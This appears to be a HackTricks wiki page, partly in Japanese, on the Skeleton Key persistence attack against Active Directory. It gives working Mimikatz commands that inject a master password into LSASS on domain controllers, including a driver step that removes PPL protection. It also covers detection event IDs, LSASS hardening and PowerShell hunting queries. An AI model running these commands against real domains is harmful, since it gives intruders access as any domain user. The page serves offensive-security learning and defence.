# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

The **Skeleton Key attack** is a technique that allows attackers to **bypass Active Directory authentication** by **injecting a master password** into the LSASS process of each domain controller. After injection, the master password (default **`mimikatz`**) can be used to authenticate as **any domain user** while their real passwords still work.

Key facts:

- Requires **Domain Admin/SYSTEM + SeDebugPrivilege** on every DC and must be **reapplied after each reboot**.
- Patches **NTLM** and **Kerberos RC4 (etype 0x17)** validation paths; AES-only realms or accounts enforcing AES will **not accept the skeleton key**.
- Can conflict with third‑party LSA authentication packages or additional smart‑card / MFA providers.
- The Mimikatz module accepts the optional switch `/letaes` to avoid touching Kerberos/AES hooks in case of compatibility issues.

### 実行

従来型（PPL 未保護）の LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
もし **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS) の場合、LSASS をパッチする前に保護を解除するためにカーネルドライバが必要です：
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
注入後は、任意のドメインアカウントで認証しますが、パスワードには `mimikatz`（またはオペレータが設定した値）を使用してください。マルチDC環境では**全てのDC**で繰り返すことを忘れないでください。

## 緩和策

- **ログ監視**
- System **Event ID 7045**（サービス/ドライバのインストール）: 署名されていないドライバ（例: `mimidrv.sys`）に注意。
- **Sysmon**: Event ID 7 は `mimidrv.sys` の driver load、Event ID 10 は非システムプロセスからの `lsass.exe` への疑わしいアクセスを示します。
- Security **Event ID 4673/4611**：機密特権の使用やLSA認証パッケージ登録の異常に関するイベント；DCからのRC4（etype 0x17）を使用した予期しない4624ログオンと相関させてください。
- **LSASS の強化**
- DCでは **RunAsPPL/Credential Guard/Secure LSASS** を有効にしておくことで、攻撃者をカーネルモードドライバの展開に追い込みます（テレメトリが増え、悪用が困難になります）。
- 可能な限りレガシーな **RC4** を無効化してください。Kerberos チケットを AES のみに制限することで、skeleton key が利用する RC4 フック経路を防げます。
- 簡易 PowerShell 検索例:
  - 署名されていないカーネルドライバのインストールを検出: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
  - Mimikatz ドライバを探す: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
  - 再起動後に PPL が有効化されているか検証: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

追加の資格情報強化のガイダンスについては [Windows credentials protections](../stealing-credentials/credentials-protections.md) を参照してください。

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
